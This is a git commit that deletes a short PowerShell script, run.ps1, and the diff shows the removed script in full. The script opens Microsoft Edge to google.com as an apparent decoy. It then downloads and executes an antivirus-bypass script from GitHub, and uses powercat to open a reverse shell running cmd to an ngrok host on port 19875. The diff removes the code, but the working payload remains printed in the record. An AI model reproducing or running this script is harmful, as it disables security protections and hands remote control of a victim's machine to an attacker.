f406870380155e4e3bc3537cfa37c45703b3703a
Osman Kandemir <juanter53@hotmail.com>
2022-09-30 00:23:10 +0300

    Delete run.ps1

--- run.ps1
+++
@@ -1,6 +0,0 @@
-start microsoft-edge:http://google.com
-$wshell = New-Object -ComObject wscript.shell;
-$wshell.AppActivate('Google - Microsoft Edge')
-IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/aloksaurabh/OffenPowerSh/master/Bypass/Invoke-AlokS-AvBypass.ps1'); 
-Invoke-AlokS-AvBypass;
-IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c 4.tcp.eu.ngrok.io -p 19875 -e cmd
